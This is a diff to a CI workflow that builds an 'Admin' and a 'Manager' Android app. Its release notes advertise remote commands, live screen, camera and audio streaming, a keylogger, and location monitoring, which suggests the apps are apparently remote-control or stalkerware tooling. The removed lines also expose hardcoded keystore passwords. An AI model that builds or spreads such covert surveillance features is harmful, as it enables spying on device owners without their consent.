@@ -11,7 +11,7 @@ on:
 
 jobs:
   build-admin:
-    name: Build Admin App (Release)
+    name: Build Admin App
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
@@ -22,30 +22,20 @@ jobs:
           java-version: '17'
           distribution: 'temurin'
 
-      - name: Create release keystore
-        working-directory: Admin-App/app
-        run: |
-          keytool -genkeypair -v \
-            -keystore release.keystore \
-            -alias abuzahra \
-            -keyalg RSA -keysize 2048 -validity 10000 \
-            -storepass abuzahra2024 -keypass abuzahra2024 \
-            -dname "CN=Abu Zahra,OU=Dev,O=AbuZahra,L=Sanaa,ST=Sanaa,C=YE"
-
-      - name: Build Admin App
+      - name: Build Admin App (Debug)
         working-directory: Admin-App
         run: |
           chmod +x gradlew
-          ./gradlew assembleRelease
+          ./gradlew assembleDebug
 
       - name: Upload Admin APK
         uses: actions/upload-artifact@v4
         with:
           name: Admin-App-APK
-          path: Admin-App/app/build/outputs/apk/release/*.apk
+          path: Admin-App/app/build/outputs/apk/debug/*.apk
 
   build-manager:
-    name: Build Manager App (Debug)
+    name: Build Manager App
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
@@ -56,7 +46,7 @@ jobs:
           java-version: '17'
           distribution: 'temurin'
 
-      - name: Build Manager App
+      - name: Build Manager App (Debug)
         working-directory: Android-App
         run: |
           chmod +x gradlew
@@ -93,10 +83,19 @@ jobs:
           body: |
             ## Abu-Zahra Admin & Manager Apps
             
-            ### Changes in v2.0.0:
-            - **Admin App**: Firebase Auth (Google Sign-In), all 8 command categories, streaming, data viewer, monitor, users management
-            - **Manager App**: Firebase config updated with real credentials
+            ### Admin App v2.0.0:
+            - Firebase Auth (Google Sign-In + Email/Password + Create Account)
+            - All 8 command categories (116 commands)
+            - Live Streaming (Screen/Camera/Audio)
+            - Data Viewer (12 data types)
+            - Monitoring (Keylogger, Screen/Audio Record, Camera, Location)
+            - User Management
+            - Command Parameter Dialogs (32 commands)
+            - Permanent Link Code per email
             
+            ### Manager App v3.5.0:
+            - Updated Firebase configuration
+          
             ### SHA1 Fingerprint (Admin App):
             `0A:27:6F:32:73:15:92:AF:77:06:03:F8:4C:81:48:00:45:75:F4:D4`
           files: |
